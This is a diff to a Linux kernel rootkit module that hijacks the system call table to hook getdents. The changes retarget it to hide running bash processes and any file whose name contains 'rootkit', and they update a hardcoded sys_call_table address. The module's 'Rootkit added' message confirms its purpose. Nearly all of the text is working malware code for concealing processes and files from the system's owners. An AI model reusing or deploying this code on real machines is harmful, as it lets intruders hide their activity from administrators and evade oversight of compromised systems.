@@ -159,13 +159,13 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 			filp_close(fcmdline, NULL);
 			if (readnums != 0)
 				printk("process cmdline %s\n", kbuf2);
-			if (readnums != 0 && strstr(kbuf2, "test") != NULL) {
+			if (readnums != 0 && strstr(kbuf2, "bash") != NULL) {
 				printk("File to hide %s\n", kbuf2);
 				pdirp->d_reclen += cdirp->d_reclen;
 			} else {
 				pdirp = cdirp;
 			}
-		} else if (strncmp(cdirp->d_name,"test", 4) == 0){
+		} else if (strstr(cdirp->d_name,"rootkit") != NULL){
 			if (pdirp == NULL)
 				dirp = (struct linux_dirent *)(start_offset + (long)(cdirp->d_reclen));
 			else
@@ -221,7 +221,7 @@ int init_module(void){
 	taken from the /boot/System map file. This address seems to be the same
 	after every boot, so for now it can be hardcoded.
 	*/
-	sys_call_table = (unsigned long*)0xc15c3060;
+	sys_call_table = (unsigned long*)0xc1688140;
 	hijack_sys_call_table();	
 	
 	printk(KERN_INFO "Rootkit added.\n\n");
